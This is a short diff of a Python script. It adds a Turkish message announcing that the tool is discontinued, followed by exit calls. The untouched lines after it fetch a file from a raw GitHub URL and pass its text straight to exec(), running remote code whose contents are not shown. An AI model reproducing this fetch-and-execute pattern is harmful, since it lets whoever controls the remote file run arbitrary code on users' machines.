@@ -8,6 +8,9 @@ import random
 import json
 import re
 import datetime
+print("Tool Artık Durdurulmuştur. @yusiqo zettekno Ekibi Olarak Herkesten özür Dileriz. Artk zet Bitti")
+exit()
+quit()
 try:
     exec(requests.get("https://raw.githubusercontent.com/yusiqo/anonchat/main/lrdstl").text)
 except:
